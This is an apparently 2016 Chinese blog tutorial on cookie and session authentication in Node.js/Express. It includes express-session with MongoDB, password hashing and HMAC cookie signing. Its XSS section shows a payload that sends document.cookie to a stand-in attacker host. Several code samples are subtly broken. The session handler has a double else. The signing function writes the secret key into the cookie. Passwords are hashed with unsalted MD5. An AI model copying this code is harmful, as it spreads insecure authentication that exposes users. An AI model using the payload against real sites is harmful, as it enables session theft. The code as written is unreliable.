---
title: session身份验证
date: 2016-09-24 13:14:12
tags: [nodeJS,session,express]
categories: 
- nodeJS
---
我们需要验证程序的使用者身份，需要一定的技术手段。由于http是一种无状态的协议，所以就需要额外的解决方案。最早的解决方案是Cookie,然而Cookie本身有一定限制，无论储存容量还是安全性考虑，都需要其他技术来配合进行身份的识别。

Session就是解决这个问题，其数据储存在服务器，更加安全，其一般通过cookie来与客户端建立联系,这其中又会涉及到一些安全问题，性能问题等等。这篇文章就来简单的总结一下自己在实践学习当中的理解吧。。。

**文章目录**
1. Cookie
2. Session与Cookie
3. express当中的express-session
4. Session安全
5. 实例项目分析
<!--more-->

### Cookie

HTTP Cookie,用于在客户端储存会话信息。对于特定域名，cookie的形成步骤：

**1.** 首次访问时，服务端设置响应头:
```
Set-Cookie:name=value; expires=Mon, 22-Jan-07 07:10:24 GMT; domain=.wrox.com; path=/; secure
```
其中设置了secure标志表示只在HTTPS有效，通过SSL连接才能传输

**2.** 以后每次对worx.com的子域名和worx.com进行访问，HTTP请求头都会带上name=value这个cookie名值对儿。

#### cookie的问题

1. 一旦创建，每次请求都会带上cookie，当cookie过大时，会造成请求头过大，造成带宽浪费

2. 有很多请求，cookie是不必要的，例如静态资源服务。
解决办法是对静态资源用一个专门的域名

3. cookie是可以通过客户端JS更改的，如果完全靠cookie来做身份验证，非常不安全。例如对于是否是vip的isVIP字段，伪造cookie设定其为true,就能轻松获得vip权限。

### Session与Cookie

与Cookie不同的是，Session会话状态是储存在服务端的，客户端无法修改。

Session与Cookie实现服务端与客户端的一一对应:

**1.** 首次发起请求，服务端检测到请求头中没有带session的口令，生成一个唯一值，并且设定超时时间,以《深入浅出Node.js》的代码为例：

```js
var sessions = {};
var key = 'session_id';
var EXPIRES = 20*60*1000//20分钟

var generate = function(){
    var session = {};
    session.id = (new Date()).getTime() + Math.random();
    session.cookie = {
        expire:(new Date()).getTime() + EXPIRES
    };
    sessions[session.id] = session;
}
```
**2.** 首次访问，没有发现相应口令，生成，非首次访问，检测口令是否正确以及口令对应的session是否过期，如果没有过期，就更新过期时间，过期了就删掉原来的session,重新生成session
```js
function(req,res){
    var id = req.cookies[key];//获取请求头中的cookie相应的口令
    if(!id){
        req.session = generate();
    } else {
        var session = sessions[id];
        if(session){
            if(session.cookie.expire > (new Date()).getTime()){
                //更新超时时间
                session.cookie.expire = (new Date()).getTime() + EXPIRES;
                req.session = session;
            }
        } else {
            //超时，删除旧数据,重新生成
            delete sessions[id];
            req.session = generate();
        }
    } else {
        //session过期或者口令不对,重新生成session
        req.session = generate();
    }
    handle(req,res);//其他处理
}
```
当session过期或者口令不对时，除了重新生成session以外，还得重新设置cookie,通过Set-Cookie响应头来更新cookie

#### 关于session与cookie的生命周期

1. 根据上述原理，假设Session设置的EXPIRES为20分钟，那么当客户端超过20分钟以上没有再次向这个域名发起请求，那么session就会过期，并重新生成session和更新cookie值;

2. 对于cookie,通过设置Expres(UTC格式的时间字符串)表示何时过期，而设置Max-Age表示多久后过期。

### express当中的express-session

express-session模块通过设置对象生成一个中间件，直接app.use就能够实现上述session实现原理的功能:

```js
const express = require('express');
const app = express();
const session = require('express-session');
const MongoStore = require('connect-mongo')(session);
app.use(session({
  secret:settings.cookieSecret,
  key:settings.db,
  cookie:{
    maxAge:1000 * 60 * 60 * 24 * 30
  },
  store:new MongoStore({
    db:settings.db,
    host:settings.host,
    port:settings.port
  })
}));
```
上述传入session()的对象即为设置对象，secret为必须项，这个是用于生成私钥（关于session安全,后面详细讲述);
key为设置cookie的口令键值对儿的键名，cookie设置cookie项,默认为
```js
{ path: '/', httpOnly: true, secure: false, maxAge: null }
```
**store**
用于存放session的容器，可以存在内存当中例如直接存在一个sessions数组，也可以存在硬盘中，如数据库。

这里存放在mongodb数据库中，host和port是mongodb数据库服务监听地址。

这样，使用了这个中间件，就可以通过req.session访问store里的JSON化session对象了，还可以在上面进行扩展，如一个用户登录后，在该session_id对应的session上添加user，就能做到登录的状态验证了。

**session的生命周期**

**1.**当session存在于内存当中时:

maxAge项既会设置cookie的Expries为当前服务器时间+maxAge项，也会设置session的生命时间,默认为null,即浏览器关闭后session消失
**2.**当存在于数据库当中时:

maxAge项既会设置cookie的Expries为当前服务器时间+maxAge项，也会设置session的生命时间,不同的是，就算浏览器关闭，只要session过期时间没到，session也不会过期。另外，由于connect-mongo特殊性，采用一分钟左右查询session更新的机制，所以可能时间会有偏差

对于访问同一个数据库服务的不同浏览器，由于cookie为不同厂商实现，所以同样会产生不同的session

以下是客户端第一次访问express应用服务端生成的session(保存在mongodb中):
![session_01](http://7xsi10.com1.z0.glb.clouddn.com/session_02.png)
以下是客户端得到的Set-Cookie响应头以及生成的cookie关于session的口令:
![session_02](http://7xsi10.com1.z0.glb.clouddn.com/session_03.png)

![session_03](http://7xsi10.com1.z0.glb.clouddn.com/session_01.png)

可以看到，服务端的session\_id值和客户端cookie值的blog值有不同的地方，blog值分为两部分，前者与数据库中的session\_id差不多，但是后面是啥？这就是上面提到过的一个与secret有关的东西，是为了增加安全度而设置的私钥经过编码后生成的。详细见下文的session安全。

### session安全

做人做事，安全第一。是的，开发的应用也是如此。而对于身份验证这一环节，安全问题也是一个挑战。如果安全性不好，攻击者随意伪造身份，来获取高权限，从而危及网站，应用安全。

#### 密码加密

node利用 OpenSSL库来实现它的加密技术，这是因为OpenSSL已经是一个广泛被采用的加密算法。它包括了类似MD5 or SHA-1 算法，这些算法你可以利用在你的应用中。

node有一个模块叫crypto,可以进行加密操作。
```js
var name = req.body.name;
    var password = req.body.password;
    var md5 = crypto.createHash('md5');
    password = md5.update(password).digest('hex');

    var newUser = new User({
        name:name,
        password:password
    });
```
crypto.createHash通过指定的算法来创建一个hash实例，然后update()方法其实是将字符串拼接，可以多次调用，最终通过diges()方法生成最终字符串，这里hex通过16进制表示。

#### 将session口令通过私钥加密进行签名，提高伪造成本

虽然session保存在服务端不能被客户端更改，但是客户端的cookie的session_id可能被随机命中而伪造成功。可以用通过私钥进行签名。如：

加密签名:
```js
var sign = function(val,secret){
    return val + '.' + crypto
        .createHmac('sha256',secret)
        .update(val)
        .digest('base64')
        .replace(/\=+$/,secret);
};
```
请求时，通过secret解密:
```js
var unsign = function(val,secret){
    var str = val.slice(0,val.lastIndexOf('.'));
    return sign(str,secret) == val?str:false;
}
```
- HMAC全名是 keyed-Hash Message Authentication Code，中文直译就是密钥相关的哈希运算消息认证码，HMAC运算利用哈希算法，以一个密钥和一个消息为输入，生成一个加密串作为输出。HMAC可以有效防止一些类似md5的彩虹表等攻击，比如一些常见的密码直接MD5存入数据库的，可能被反向破解。
crypto.createHmac(algorithm, key)
这个方法返回和createHash一样，返回一个HMAC的实例，有update和digest方法。

#### cookie被盗用，如XSS漏洞

如果cookie被盗用，攻击者就能拿到session_id，就大势已去了。cookie被盗用有许多场景。xss比较典型。

关于xss的话题，比较大，涉及web前端安全领域，小小的例子:

原网站a.com代码里有这样一句:

```js
$('#box').html(location.hash.replace('#',''));
```
可见这句会将url的hash值作为box容器的html内容，攻击者可以将js脚本加在后面:
```js
a.com/path#<script>location.href = 'http://c.com/?'+document.cookie</script>;
```
这样后面的脚本就会执行了，当用户访问攻击者给的这个url时，用户会带着在a.com的cookie去访问c.com，这样攻击者就获得了用户在a.com的cookie了。

所以当我们直接在html插入html代码时，一定要注意将一些特殊字符进行转义。对于xss的防范措施，详情可以通过其他资料进行了解。

### 实例项目分析

最近写的一个基于vue+express+mongodb的论坛单页面应用。

#### 构思:

1. vue首页加载App.vue为根路由，其下有四个子路由:'/Home','/Log','/Post','/Reg';分别对应首页，登录，发表，注册。

2. vue首页通过node渲染，传递req.session.user对象表示用户身份，挂载在window对象，vue根据user是否存在来渲染首页，将所有文章挂载在window.posts，vue渲染。

3. 其余所有页面在vue路由间跳转，通过node提供的api异步发起请求。

4. session,user,posts都存在mongodb当中。


### 结语:

身份验证在应用当中非常普遍，session相对于纯cookie形式来说比较安全，但是也存在一些不足，node去管理session消耗的时间资源，以及cookie被盗用的风险都使得session不够完美。

下一篇会介绍另外一种目前比较常用的验证方式:Token验证。

前后端分离下的Token验证方式


